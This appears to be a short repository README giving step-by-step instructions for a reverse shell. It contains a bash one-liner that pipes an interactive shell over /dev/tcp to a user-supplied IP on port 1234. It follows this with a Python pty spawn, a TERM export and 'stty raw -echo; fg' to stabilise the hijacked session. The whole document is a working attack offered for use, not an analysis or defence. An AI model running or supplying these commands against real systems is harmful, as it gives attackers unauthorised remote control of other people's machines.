Reverse Shell Connection Attempt
This repository contains a script that attempts to establish a reverse shell connection to a specified local IP address. The script is written in Bash and Python and utilizes some additional settings and commands to spawn an interactive shell.

Instructions
Replace [##Your Local IP Address##] with your actual local IP address. This is the IP address where you want to establish the reverse shell connection.

Run the following command in your terminal to initiate the reverse shell connection:

bash -c 'bash -i >& /dev/tcp/[##Your Local IP Address##]/1234 0>&1'
Note: Make sure to replace [##Your Local IP Address##] with your actual IP address.


Additionally, you can use Python to spawn an interactive shell by running the following command:

python3 -c 'import pty;pty.spawn("/bin/bash")'
This command imports the pty module in Python and spawns a new interactive shell using /bin/bash.


To ensure proper terminal functionality, set the TERM environment variable to xterm using the following command:

export TERM=xterm
This step is important to maintain proper terminal settings during the reverse shell session.


Finally, set the terminal settings to raw mode and disable echo by running the following command:

stty raw -echo; fg
This command configures the terminal to handle raw input and disable echo, allowing for a smoother interactive experience. The fg command brings the backgrounded process to the foreground.
